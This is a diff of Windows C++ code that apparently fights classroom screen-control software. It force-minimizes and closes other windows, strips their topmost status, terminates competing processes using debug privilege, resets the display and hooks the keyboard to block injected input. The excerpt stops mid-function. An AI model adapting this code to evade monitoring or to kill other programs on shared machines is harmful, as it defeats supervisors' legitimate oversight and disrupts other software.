+// 安全的窗口句柄检查函数
+static bool IsMyWindowSafe(HWND hwnd) {
+    if (!hwnd) return false;
+    
+    // 使用互斥锁保护
+    std::lock_guard<std::mutex> lock(g_MyWindowsMutex);
+    
+    for (HWND myHwnd : g_MyWindows) {
+        if (myHwnd == hwnd && IsWindow(hwnd)) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+// 验证并修复窗口句柄
+static void ValidateAndFixWindowHandles() {
+    std::lock_guard<std::mutex> lock(g_MyWindowsMutex);
+    
+    // 使用反向遍历，避免删除元素时的索引问题
+    for (size_t i = g_MyWindows.size(); i > 0; i--) {
+        HWND hwnd = g_MyWindows[i - 1];
+        
+        if (!IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
+            // 窗口句柄无效或不可见，移除它
+            g_MyWindows.erase(g_MyWindows.begin() + (i - 1));
+        }
+    }
+}
+
+// 检测并切换回原始桌面（防止恶意程序切换桌面）
+static void DetectAndSwitchToOriginalDesktop() {
+    HDESK currentDesktop = GetThreadDesktop(GetCurrentThreadId());
+    if (!currentDesktop) return;
+    
+    // 如果当前桌面和原始桌面不同，切换回原始桌面
+    if (g_originalDesktop && g_originalDesktop != currentDesktop) {
+        SetThreadDesktop(g_originalDesktop);
+        SwitchDesktop(g_originalDesktop);
+        std::wcout << L"检测到桌面切换，已切换回原始桌面" << std::endl;
+    }
+}
+
+// 初始化桌面防护
+static void InitDesktopProtection() {
+    // 保存原始桌面
+    g_originalDesktop = GetThreadDesktop(GetCurrentThreadId());
+    g_currentDesktop = g_originalDesktop;
+}
+
+// 清理桌面防护
+static void CleanupDesktopProtection() {
+    g_originalDesktop = NULL;
+    g_currentDesktop = NULL;
+}
+
+// 检测并恢复F11全屏窗口（仅检测其他程序的独占全屏窗口）
+void DetectAndRestoreFullscreenWindows() {
+    // 使用增强的窗口句柄获取函数
+    GetMyWindowsEnhanced();
+    
+    // 定期验证并修复窗口句柄
+    static DWORD lastValidationTime = 0;
+    DWORD currentTime = GetTickCount();
+    if (currentTime - lastValidationTime > 500) {
+        ValidateAndFixWindowHandles();
+        lastValidationTime = currentTime;
+    }
+    
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        if (!hwnd || !IsWindow(hwnd)) return TRUE;
+        
+        DWORD pid;
+        GetWindowThreadProcessId(hwnd, &pid);
+        
+        // 检查是否是本程序的窗口（使用多种方法确保准确性）
+        bool isMyWindow = false;
+        
+        // 方法1：通过进程ID检查
+        if (pid == GetCurrentProcessId()) {
+            isMyWindow = true;
+        }
+        
+        // 方法2：通过窗口句柄列表检查
+        if (!isMyWindow) {
+            for (HWND myHwnd : g_MyWindows) {
+                if (hwnd == myHwnd) {
+                    isMyWindow = true;
+                    break;
+                }
+            }
+        }
+        
+        // 方法3：通过窗口类名检查
+        if (!isMyWindow) {
+            wchar_t className[256] = {};
+            GetClassNameW(hwnd, className, 256);
+            
+            wchar_t exePath[MAX_PATH];
+            if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+                wchar_t exeName[MAX_PATH];
+                wchar_t drive[_MAX_DRIVE];
+                wchar_t dir[_MAX_DIR];
+                wchar_t ext[_MAX_EXT];
+                _wsplitpath_s(exePath, drive, dir, exeName, ext);
+                
+                // 移除.exe扩展名
+                wchar_t* dot = wcsrchr(exeName, L'.');
+                if (dot) {
+                    *dot = L'\0';
+                }
+                
+                if (wcscmp(className, exeName) == 0) {
+                    isMyWindow = true;
+                }
+            }
+        }
+        
+        // 方法4：检查窗口标题是否包含程序名
+        if (!isMyWindow) {
+            wchar_t windowTitle[256] = {};
+            GetWindowTextW(hwnd, windowTitle, 256);
+            
+            wchar_t exePath[MAX_PATH];
+            if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+                wchar_t exeName[MAX_PATH];
+                wchar_t drive[_MAX_DRIVE];
+                wchar_t dir[_MAX_DIR];
+                wchar_t ext[_MAX_EXT];
+                _wsplitpath_s(exePath, drive, dir, exeName, ext);
+                
+                if (wcsstr(windowTitle, exeName) != nullptr) {
+                    isMyWindow = true;
+                }
+            }
+        }
+        
+        if (isMyWindow) return TRUE;
+        
+        // 获取窗口样式
+        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        
+        // 获取窗口类名
+        wchar_t className[256] = {};
+        GetClassNameW(hwnd, className, 256);
+        
+        // 获取窗口标题
+        wchar_t windowTitle[256] = {};
+        GetWindowTextW(hwnd, windowTitle, 256);
+        
+        RECT rect;
+        if (!GetWindowRect(hwnd, &rect)) return TRUE;
+        
+        int winW = rect.right - rect.left;
+        int winH = rect.bottom - rect.top;
+        int screenW = GetSystemMetrics(SM_CXSCREEN);
+        int screenH = GetSystemMetrics(SM_CYSCREEN);
+        
+        // 检查是否全屏且没有标题栏
+        bool isFullscreen = (winW >= screenW * 0.95f && winH >= screenH * 0.95f);
+        bool noCaption = (style & WS_CAPTION) == 0;
+        bool noBorder = (style & WS_BORDER) == 0;
+        bool hasMenu = (style & WS_SYSMENU) != 0;
+        
+        // 检测是否是Explorer窗口
+        bool isExplorer = wcsstr(className, L"CabinetWClass") != nullptr ||
+                        wcsstr(className, L"ExploreWClass") != nullptr;
+        
+        // 只处理真正的F11全屏窗口（Explorer或没有标题栏的窗口）
+        if (isFullscreen && (isExplorer || (noCaption && noBorder && hasMenu))) {
+            // 使用SetWindowPlacement恢复
+            ShowWindow(hwnd, SW_RESTORE);
+            WINDOWPLACEMENT wp = { sizeof(wp) };
+            if (GetWindowPlacement(hwnd, &wp)) {
+                if (wp.showCmd != SW_SHOWNORMAL) {
+                    wp.showCmd = SW_SHOWNORMAL;
+                    SetWindowPlacement(hwnd, &wp);
+                }
+            }
+        }
+        
+        return TRUE;
+    }, 0);
+}
+
+// 检测DXGI/GDI全屏覆盖窗口并最小化（排除本程序窗口）
+void DetectAndMinimizeOverlayWindows() {
+    // 使用增强的窗口句柄获取函数
+    GetMyWindowsEnhanced();
+    
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        if (!hwnd || !IsWindow(hwnd)) return TRUE;
+        
+        // 检测可疑的全屏覆盖窗口
+        wchar_t className[256] = {};
+        wchar_t windowTitle[256] = {};
+        
+        GetClassNameW(hwnd, className, 256);
+        GetWindowTextW(hwnd, windowTitle, 256);
+        
+        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+        
+        RECT rect;
+        if (!GetWindowRect(hwnd, &rect)) return TRUE;
+        
+        int winW = rect.right - rect.left;
+        int winH = rect.bottom - rect.top;
+        int screenW = GetSystemMetrics(SM_CXSCREEN);
+        int screenH = GetSystemMetrics(SM_CYSCREEN);
+        
+        // 检查是否全屏
+        bool isFullscreen = (winW >= screenW * 0.95f && winH >= screenH * 0.95f);
+        if (!isFullscreen) return TRUE;
+        
+        // 检测DXGI/D3D类名
+        bool isDXGIClass = wcsstr(className, L"DXGI") != nullptr ||
+                         wcsstr(className, L"D3D") != nullptr ||
+                         wcsstr(className, L"Overlay") != nullptr ||
+                         wcsstr(className, L"Hook") != nullptr;
+        
+        // 检测Runtime Broker类
+        bool isRuntimeBroker = wcsstr(className, L"RuntimeBroker") != nullptr;
+        
+        // 检测分层窗口
+        bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
+        
+        // 检测小窗口（可能是子窗口）
+        bool isSmallWindow = (winW < 300 && winH < 300);
+        
+        // 检测无标题窗口
+        bool noTitle = (windowTitle[0] == L'\0');
+        
+        // 检测是否是最上方的窗口
+        HWND topWindow = GetTopWindow(NULL);
+        bool isTopWindow = (hwnd == topWindow);
+        
+        // 如果是可疑的全屏覆盖窗口，最小化它
+        bool shouldMinimize = false;
+        if (isTopWindow && isDXGIClass && isFullscreen) {
+            shouldMinimize = true;
+        }
+        
+        // Runtime Broker子窗口最小化逻辑
+        if (isTopWindow && isRuntimeBroker && isSmallWindow && noTitle) {
+            shouldMinimize = true;
+        }
+        
+        if (shouldMinimize) {
+            // 最小化窗口而不是销毁
+            ShowWindow(hwnd, SW_MINIMIZE);
+        }
+        
+        return TRUE;
+    }, 0);
+}
+
+// 强制设置前台窗口（对抗电子教室的焦点拦截）
+bool ForceSetForegroundWindow(HWND hwnd) {
+    if (!hwnd || !IsWindow(hwnd)) return false;
+    
+    // 方法1: 直接调用SetForegroundWindow
+    if (SetForegroundWindow(hwnd)) {
+        return true;
+    }
+    
+    // 方法2: 获取前台窗口线程并附加
+    HWND fgWnd = GetForegroundWindow();
+    if (fgWnd) {
+        DWORD fgPid, ourPid;
+        GetWindowThreadProcessId(fgWnd, &fgPid);
+        ourPid = GetCurrentProcessId();
+        
+        if (fgPid != ourPid) {
+            if (AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(fgWnd, NULL), TRUE)) {
+                SetForegroundWindow(hwnd);
+                AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(fgWnd, NULL), FALSE);
+            }
+        }
+    }
+    
+    // 方法3: 使用SwitchToThisWindow
+    SwitchToThisWindow(hwnd, TRUE);
+    
+    // 方法4: 再次尝试SetForegroundWindow
+    SetForegroundWindow(hwnd);
+    
+    return SetForegroundWindow(hwnd);
+}
+
+// 最小化最上方窗口线程函数
+void MinimizeTopWindowThreadFunc() {
+    std::map<HWND, int> windowMinimizeCount;
+    
+    while (g_minimizeTopWindowEnabled) {
+        HWND topWindow = GetTopWindow(NULL);
+        if (!topWindow || !IsWindow(topWindow)) {
+            Sleep(2);
+            continue;
+        }
+        
+        // 检查是否是本程序的窗口（使用多种方法确保准确性）
+        bool isMyWindow = false;
+        
+        // 方法1：通过进程ID检查
+        DWORD pid;
+        GetWindowThreadProcessId(topWindow, &pid);
+        if (pid == GetCurrentProcessId()) {
+            isMyWindow = true;
+        }
+        
+        // 方法2：通过窗口句柄列表检查
+        if (!isMyWindow) {
+            isMyWindow = IsMyWindowSafe(topWindow);
+        }
+        
+        // 方法3：通过窗口类名检查
+        if (!isMyWindow) {
+            wchar_t className[256] = {};
+            GetClassNameW(topWindow, className, 256);
+            
+            wchar_t exePath[MAX_PATH];
+            if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+                wchar_t exeName[MAX_PATH];
+                wchar_t drive[_MAX_DRIVE];
+                wchar_t dir[_MAX_DIR];
+                wchar_t ext[_MAX_EXT];
+                _wsplitpath_s(exePath, drive, dir, exeName, ext);
+                
+                // 移除.exe扩展名
+                wchar_t* dot = wcsrchr(exeName, L'.');
+                if (dot) {
+                    *dot = L'\0';
+                }
+                
+                if (wcscmp(className, exeName) == 0) {
+                    isMyWindow = true;
+                }
+            }
+        }
+        
+        // 方法4：检查窗口标题是否包含程序名
+        if (!isMyWindow) {
+            wchar_t windowTitle[256] = {};
+            GetWindowTextW(topWindow, windowTitle, 256);
+            
+            wchar_t exePath[MAX_PATH];
+            if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+                wchar_t exeName[MAX_PATH];
+                wchar_t drive[_MAX_DRIVE];
+                wchar_t dir[_MAX_DIR];
+                wchar_t ext[_MAX_EXT];
+                _wsplitpath_s(exePath, drive, dir, exeName, ext);
+                
+                if (wcsstr(windowTitle, exeName) != nullptr) {
+                    isMyWindow = true;
+                }
+            }
+        }
+        
+        // 方法5：检查是否是置顶功能的目标窗口（不最小化保护目标）
+        if (!isMyWindow && g_alwaysOnTopEnabled && g_targetTopmostWindow) {
+            if (topWindow == g_targetTopmostWindow) {
+                isMyWindow = true;
+            }
+        }
+        
+        if (!isMyWindow) {
+            // 不是自己的窗口，最小化它
+            ShowWindow(topWindow, SW_MINIMIZE);
+            windowMinimizeCount[topWindow]++;
+            
+            // 如果已经最小化了3次，尝试强制销毁
+            if (windowMinimizeCount[topWindow] >= 3) {
+                PostMessageW(topWindow, WM_CLOSE, 0, 0);
+                windowMinimizeCount[topWindow] = 0;
+            }
+        } else {
+            // 是自己的窗口，重置计数
+            windowMinimizeCount.clear();
+        }
+        
+        Sleep(10);
+    }
+}
+
+// ===================================================================
+// 强制置顶增强：窗口子类化辅助函数
+// ===================================================================
+
+// 前置声明：窗口子类化回调
+LRESULT CALLBACK TopmostSubclassProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
+static void RemoveTopmostSubclass();
+static void RestoreDesktopQuick();
+// 全量清场：扫描所有顶层窗口，剥离TOPMOST + 沉底 + 隐藏非目标覆盖窗口
+static void ForceStripAllCompetitors(HWND targetHwnd);
+
+// 安装子类化 - 挂钩目标窗口的消息循环
+static void InstallTopmostSubclass(HWND hwnd) {
+    if (!hwnd || !IsWindow(hwnd)) return;
+    
+    // 不子类化自身进程的窗口
+    DWORD pid = 0;
+    GetWindowThreadProcessId(hwnd, &pid);
+    if (pid == GetCurrentProcessId()) return;
+    
+    // 如果已经有子类化的窗口，先解除
+    if (g_subclassedHwnd && g_subclassedHwnd != hwnd) {
+        RemoveTopmostSubclass();
+    }
+    
+    if (g_subclassedHwnd == hwnd) return; // 已经子类化过了
+    
+    g_originalTargetWndProc = (WNDPROC)SetWindowLongPtrW(
+        hwnd, GWLP_WNDPROC, (LONG_PTR)TopmostSubclassProc);
+    
+    if (g_originalTargetWndProc) {
+        g_subclassedHwnd = hwnd;
+    }
+}
+
+// 移除子类化 - 恢复原始窗口过程
+static void RemoveTopmostSubclass() {
+    if (g_subclassedHwnd && g_originalTargetWndProc && IsWindow(g_subclassedHwnd)) {
+        SetWindowLongPtrW(g_subclassedHwnd, GWLP_WNDPROC, (LONG_PTR)g_originalTargetWndProc);
+    }
+    g_subclassedHwnd = NULL;
+    g_originalTargetWndProc = NULL;
+}
+
+// ===================================================================
+// 强制置顶增强：WinEvent Hook 回调 — 零延迟响应窗口事件
+// ===================================================================
+
+VOID CALLBACK TopmostWinEventProc(
+    HWINEVENTHOOK hWinEventHook,
+    DWORD event,
+    HWND hwnd,
+    LONG idObject,
+    LONG idChild,
+    DWORD dwEventThread,
+    DWORD dwmsEventTime
+) {
+    // 忽略非窗口对象和子窗口
+    if (idObject != OBJID_WINDOW || idChild != CHILDID_SELF) return;
+    if (!g_alwaysOnTopEnabled) return;
+    if (!hwnd || !IsWindow(hwnd)) return;
+    
+    // 忽略本进程的窗口
+    DWORD eventPid = 0;
+    GetWindowThreadProcessId(hwnd, &eventPid);
+    if (eventPid == GetCurrentProcessId()) return;
+    
+    // 只处理顶层窗口（忽略子窗口/控件）
+    if (GetAncestor(hwnd, GA_PARENT) != GetDesktopWindow()) return;
+    
+    HWND targetHwnd = g_targetTopmostWindow;
+    
+    // 如果目标句柄失效，尝试通过类名重新获取
+    if (!targetHwnd || !IsWindow(targetHwnd)) {
+        if (!g_targetWindowClass.empty()) {
+            targetHwnd = FindWindowW(g_targetWindowClass.c_str(), NULL);
+            if (targetHwnd && IsWindow(targetHwnd)) {
+                g_targetTopmostWindow = targetHwnd;
+                // 新窗口需要重新子类化
+                if (g_subclassedHwnd != targetHwnd) {
+                    RemoveTopmostSubclass();
+                    InstallTopmostSubclass(targetHwnd);
+                }
+            }
+        }
+        if (!targetHwnd || !IsWindow(targetHwnd)) return;
+    }
+    
+    switch (event) {
+        case EVENT_SYSTEM_FOREGROUND:
+        {
+            // 前台窗口被抢走 — 全量清场并反击
+            if (hwnd != targetHwnd) {
+                InterlockedExchange(&g_topmostFightMode, 1);
+                g_lastTopmostFightTime = GetTickCount();
+                ForceStripAllCompetitors(targetHwnd);
+                ForceSetForegroundWindow(targetHwnd);
+            }
+            break;
+        }
+        
+        case EVENT_OBJECT_CREATE:
+        case EVENT_OBJECT_SHOW:
+        case EVENT_OBJECT_DESTROY:
+        {
+            if (event == EVENT_OBJECT_DESTROY) {
+                // 目标窗口被销毁 — 清理状态
+                if (hwnd == targetHwnd) {
+                    g_targetTopmostWindow = NULL;
+                    if (g_subclassedHwnd == hwnd) {
+                        g_subclassedHwnd = NULL;
+                        g_originalTargetWndProc = NULL;
+                    }
+                }
+            } else if (hwnd != targetHwnd && IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+                // 干扰窗口每秒约20次创建，限速处理（但TOPMOST窗口不跳过）
+                static DWORD lastObjEvent = 0;
+                DWORD now = GetTickCount();
+                LONG eventEx = GetWindowLongW(hwnd, GWL_EXSTYLE);
+                bool isTopmost = (eventEx & WS_EX_TOPMOST) != 0;
+                
+                if (isTopmost || (now - lastObjEvent >= 100)) {
+                    if (!isTopmost) lastObjEvent = now;
+                    InterlockedExchange(&g_topmostFightMode, 1);
+                    g_lastTopmostFightTime = GetTickCount();
+                    ForceStripAllCompetitors(targetHwnd);
+                }
+            }
+            break;
+        }
+        
+        case EVENT_SYSTEM_MINIMIZESTART:
+        {
+            // 目标窗口正在被最小化 — 立即恢复
+            if (hwnd == targetHwnd) {
+                InterlockedExchange(&g_topmostFightMode, 1);
+                g_lastTopmostFightTime = GetTickCount();
+                
+                // 异步恢复窗口
+                ShowWindowAsync(hwnd, SW_RESTORE);
+                ShowWindowAsync(hwnd, SW_SHOWNORMAL);
+                ForceSetForegroundWindow(hwnd);
+                
+                // 强制重写 TOPMOST 扩展样式
+                LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+                SetWindowLongW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TOPMOST);
+                SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
+                    SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE | SWP_ASYNCWINDOWPOS);
+            }
+            break;
+        }
+    }
+}
+
+// ===================================================================
+// 强制置顶增强：窗口子类化过程 — 消息级拦截
+// ===================================================================
+
+LRESULT CALLBACK TopmostSubclassProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    // 如果置顶功能已停止，自动恢复原始窗口过程
+    if (!g_alwaysOnTopEnabled) {
+        if (g_originalTargetWndProc && g_subclassedHwnd == hwnd) {
+            SetWindowLongPtrW(hwnd, GWLP_WNDPROC, (LONG_PTR)g_originalTargetWndProc);
+            g_originalTargetWndProc = NULL;
+            g_subclassedHwnd = NULL;
+        }
+        return DefWindowProcW(hwnd, msg, wParam, lParam);
+    }
+    
+    switch (msg) {
+        case WM_WINDOWPOSCHANGING:
+        {
+            // 核心拦截：阻止任何改变Z序或移除TOPMOST的操作
+            WINDOWPOS* wp = (WINDOWPOS*)lParam;
+            
+            // 如果外部程序试图改变Z序
+            if (!(wp->flags & SWP_NOZORDER)) {
+                wp->flags |= SWP_NOZORDER;  // 冻结Z序
+                wp->hwndInsertAfter = HWND_TOPMOST;  // 强制保持在最顶层
+                
+                // 进入战斗模式
+                InterlockedExchange(&g_topmostFightMode, 1);
+                g_lastTopmostFightTime = GetTickCount();
+            }
+            break;
+        }
+        
+        case WM_WINDOWPOSCHANGED:
+        {
+            // 窗口位置变化后，立即重新强制TOPMOST（对抗竞争者也在用HWND_TOPMOST的情况）
+            LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+            
+            // 无论如何都重新写入TOPMOST样式
+            SetWindowLongW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TOPMOST);
+            
+            // 多重SetWindowPos确保Z序正确
+            for (int i = 0; i < 3; i++) {
+                SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
+                    SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE | SWP_ASYNCWINDOWPOS);
+            }
+            
+            // 检查是否确实在最顶层
+            HWND aboveWnd = GetWindow(hwnd, GW_HWNDPREV);
+            if (aboveWnd != NULL) {
+                // 有窗口在我们上面，进入战斗模式
+                InterlockedExchange(&g_topmostFightMode, 1);
+                g_lastTopmostFightTime = GetTickCount();
+                
+                // 剥离上面窗口的TOPMOST标志
+                LONG aboveExStyle = GetWindowLongW(aboveWnd, GWL_EXSTYLE);
+                if (aboveExStyle & WS_EX_TOPMOST) {
+                    SetWindowLongW(aboveWnd, GWL_EXSTYLE, aboveExStyle & ~WS_EX_TOPMOST);
+                    SetWindowPos(aboveWnd, HWND_NOTOPMOST, 0, 0, 0, 0,
+                        SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_ASYNCWINDOWPOS);
+                }
+                
+                // 重新置顶自己
+                SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
+                    SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE | SWP_ASYNCWINDOWPOS);
+            }
+            break;
+        }
+        
+        case WM_SHOWWINDOW:
+        {
+            // 拦截外部程序隐藏窗口
+            if (wParam == FALSE && lParam != 0) {
+                return 0; // 拒绝隐藏
+            }
+            break;
+        }
+        
+        case WM_SYSCOMMAND:
+        {
+            UINT cmd = (wParam & 0xFFF0);
+            // 拦截最小化命令
+            if (cmd == SC_MINIMIZE) {
+                InterlockedExchange(&g_topmostFightMode, 1);
+                g_lastTopmostFightTime = GetTickCount();
+                return 0; // 拒绝最小化
+            }
+            break;
+        }
+        
+        case WM_NCACTIVATE:
+        {
+            // 保持活动窗口外观 — 防止电子教室软件通过失活来降低用户体验
+            if (wParam == FALSE && lParam) {
+                InterlockedExchange(&g_topmostFightMode, 1);
+                g_lastTopmostFightTime = GetTickCount();
+                // 仍然传递消息，但标记战斗模式
+            }
+            break;
+        }
+        
+        case WM_DESTROY:
+        {
+            // 窗口被销毁，清理子类化记录
+            if (g_subclassedHwnd == hwnd) {
+                g_subclassedHwnd = NULL;
+                g_originalTargetWndProc = NULL;
+                g_targetTopmostWindow = NULL;
+            }
+            break;
+        }
+        
+        case WM_CLOSE:
+        {
+            // 阻止外部程序关闭目标窗口
+            // 消息框、退出确认等仍由原始过程处理
+            break;
+        }
+    }
+    
+    // 调用原始窗口过程
+    if (g_originalTargetWndProc) {
+        return CallWindowProcW(g_originalTargetWndProc, hwnd, msg, wParam, lParam);
+    }
+    return DefWindowProcW(hwnd, msg, wParam, lParam);
+}
+
+// ===================================================================
+// 强制置顶增强：全量清场 — 剥离所有非目标窗口的TOPMOST+沉底+隐藏
+// ===================================================================
+
+static void ForceStripAllCompetitors(HWND targetHwnd) {
+    if (!targetHwnd || !IsWindow(targetHwnd)) return;
+    
+    DWORD myPid = GetCurrentProcessId();
+    
+    // 跟踪频繁创建覆盖窗口的进程（10秒内同一PID被标记3次则终止）
+    static std::map<DWORD, int> pidStrike;
+    static DWORD pidStrikeTime = GetTickCount();
+    DWORD now = GetTickCount();
+    if (now - pidStrikeTime > 10000) {
+        pidStrike.clear();
+        pidStrikeTime = now;
+    }
+    
+    struct ScanParam { HWND tgt; std::map<DWORD, int>* strikes; DWORD* stTime; };
+    ScanParam p = { targetHwnd, &pidStrike, &pidStrikeTime };
+    
+    EnumWindows([](HWND ew, LPARAM lParam) -> BOOL {
+        ScanParam* sp = reinterpret_cast<ScanParam*>(lParam);
+        HWND tgt = sp->tgt;
+        int sw = GetSystemMetrics(SM_CXSCREEN);
+        int sh = GetSystemMetrics(SM_CYSCREEN);
+        DWORD myId = GetCurrentProcessId();
+        
+        if (!ew || !IsWindow(ew) || !IsWindowVisible(ew)) return TRUE;
+        if (ew == tgt) return TRUE;
+        
+        RECT r;
+        if (!GetWindowRect(ew, &r)) return TRUE;
+        
+        DWORD pid = 0;
+        GetWindowThreadProcessId(ew, &pid);
+        if (pid == myId) return TRUE;
+        
+        wchar_t cn[256] = {};
+        GetClassNameW(ew, cn, 256);
+        if (wcscmp(cn, L"Progman") == 0 || wcscmp(cn, L"WorkerW") == 0 ||
+            wcscmp(cn, L"Shell_TrayWnd") == 0) return TRUE;
+        
+        LONG es = GetWindowLongW(ew, GWL_EXSTYLE);
+        LONG s = GetWindowLongW(ew, GWL_STYLE);
+        int w = r.right - r.left;
+        int h = r.bottom - r.top;
+        bool isFullscreen = (w >= sw * 94 / 100 && h >= sh * 94 / 100);
+        bool isOverlap = (r.left < sw && r.top < sh && r.right > 0 && r.bottom > 0);
+        
+        // 已知的正常全屏窗口类名（游戏/视频播放器等）
+        bool knownFullscreenApp = false;
+        // 跳过属性浏览器文件管理器等
+        if (wcscmp(cn, L"CabinetWClass") == 0 ||
+            wcscmp(cn, L"ExploreWClass") == 0) knownFullscreenApp = true;
+        
+        // 策略1：任何全屏窗口（非目标/非桌面/非自身/非已知正常应用）→ 沉底 + 隐藏 + 移出屏幕
+        if (isFullscreen && !knownFullscreenApp) {
+            if (es & WS_EX_TOPMOST) {
+                SetWindowLongW(ew, GWL_EXSTYLE, es & ~WS_EX_TOPMOST);
+            }
+            SetWindowPos(ew, HWND_BOTTOM, -5000, -5000, 0, 0,
+                SWP_NOSIZE | SWP_NOACTIVATE | SWP_ASYNCWINDOWPOS);
+            ShowWindowAsync(ew, SW_HIDE);
+            ShowWindowAsync(ew, SW_MINIMIZE);
+            
+            // 跟踪该进程的违规次数，超过阈值则终止
+            auto* sp2 = reinterpret_cast<ScanParam*>(lParam);
+            auto& strikes = *sp2->strikes;
+            DWORD sTime = *sp2->stTime;
+            DWORD now2 = GetTickCount();
+            if (now2 - sTime > 10000) {
+                strikes.clear();
+                *sp2->stTime = now2;
+            }
+            strikes[pid]++;
+            if (strikes[pid] >= 2) {
+                EnablePrivilege(SE_DEBUG_NAME);
+                HANDLE hp = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, FALSE, pid);
+                if (hp) {
+                    TerminateProcess(hp, 0);
+                    CloseHandle(hp);
+                    strikes.erase(pid);
+                } else {
+                    // OpenProcess失败 → UIPI阻止了句柄访问
+                    // 用系统API强行终结
+                    EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
+                    hp = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+                    if (hp) {
+                        TerminateProcess(hp, 0);
+                        CloseHandle(hp);
+                        strikes.erase(pid);
+                    }
+                }
+            }
+            
+            return TRUE;
+        }
+        
+        // 策略1b：非全屏但遮挡目标超过50%的窗口 → 直接关闭
+        if (!isFullscreen && r.right > 0 && r.bottom > 0) {
+            RECT tr;
+            if (GetWindowRect(tgt, &tr)) {
+                RECT intersection;
+                if (IntersectRect(&intersection, &r, &tr)) {
+                    int interW = intersection.right - intersection.left;
+                    int interH = intersection.bottom - intersection.top;
+                    int tgtW = tr.right - tr.left;
+                    int tgtH = tr.bottom - tr.top;
+                    if (interW >= tgtW / 2 && interH >= tgtH / 2) {
+                        SetWindowPos(ew, HWND_BOTTOM, -5000, -5000, 0, 0,
+                            SWP_NOSIZE | SWP_NOACTIVATE | SWP_ASYNCWINDOWPOS);
+                        ShowWindowAsync(ew, SW_HIDE);
+                    }
+                }
+            }
+        }
+        
+        // 策略2：任何置顶窗口（不在目标上方也可疑）→ 剥离TOPMOST
+        if (es & WS_EX_TOPMOST) {
+            SetWindowLongW(ew, GWL_EXSTYLE, es & ~WS_EX_TOPMOST);
+            SetWindowPos(ew, HWND_NOTOPMOST, 0, 0, 0, 0,
+                SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_ASYNCWINDOWPOS);
+        }
+        
+        return TRUE;
+    }, (LPARAM)&p);
+    
+    // 最终置顶目标
+    LONG te = GetWindowLongW(targetHwnd, GWL_EXSTYLE);
+    SetWindowLongW(targetHwnd, GWL_EXSTYLE, te | WS_EX_TOPMOST);
+    SetWindowPos(targetHwnd, HWND_TOPMOST, 0, 0, 0, 0,
+        SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE | SWP_ASYNCWINDOWPOS);
+    
+    // ===== DWM/DirectX覆盖层持续销毁（5秒1次）=====
+    static DWORD lastDwmReset = 0;
+    if (now - lastDwmReset > 5000) {
+        EnablePrivilege(SE_DEBUG_NAME);
+        DEVMODE dm = {0};
+        dm.dmSize = sizeof(dm);
+        if (EnumDisplaySettingsW(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
+            ChangeDisplaySettingsW(&dm, CDS_RESET);
+        }
+        lastDwmReset = now;
+    }
+    
+    // ===== 黑屏像素检测兜底（3.5秒1次，检测肃静类全黑覆盖）=====
+    static DWORD lastPixelCheck = 0;
+    if (now - lastPixelCheck > 3500) {
+        HDC hdc = GetDC(NULL);
+        if (hdc) {
+            int screenW = GetSystemMetrics(SM_CXSCREEN);
+            int screenH = GetSystemMetrics(SM_CYSCREEN);
+            COLORREF leftPixel = GetPixel(hdc, screenW / 4, screenH / 2);
+            COLORREF rightPixel = GetPixel(hdc, screenW * 3 / 4, screenH / 2);
+            ReleaseDC(NULL, hdc);
+            bool leftBlack = GetRValue(leftPixel) <= 32 && GetGValue(leftPixel) <= 32 && GetBValue(leftPixel) <= 32;
+            bool rightBlack = GetRValue(rightPixel) <= 32 && GetGValue(rightPixel) <= 32 && GetBValue(rightPixel) <= 32;
+            if (leftBlack && rightBlack) {
+                EnablePrivilege(SE_DEBUG_NAME);
+                DEVMODE dm = {0};
+                dm.dmSize = sizeof(dm);
+                if (EnumDisplaySettingsW(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
+                    ChangeDisplaySettingsW(&dm, CDS_RESET);
+                }
+            }
+        }
+        lastPixelCheck = now;
+    }
+}
+
+// ===================================================================
+// 强制置顶增强：低层键盘钩子 — 阻止外部程序模拟键盘输入
+// ===================================================================
+
+// 键盘钩子回调：检测 LLKHF_INJECTED 标志并拦截注入的模拟按键
+static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
+        
+        // LLKHF_INJECTED (bit 4) 表示 SendInput/keybd_event 注入
+        // LLKHF_LOWER_IL_INJECTED (bit 1) 表示低完整性级别进程注入
+        if (pKbd->flags & (LLKHF_INJECTED | LLKHF_LOWER_IL_INJECTED)) {
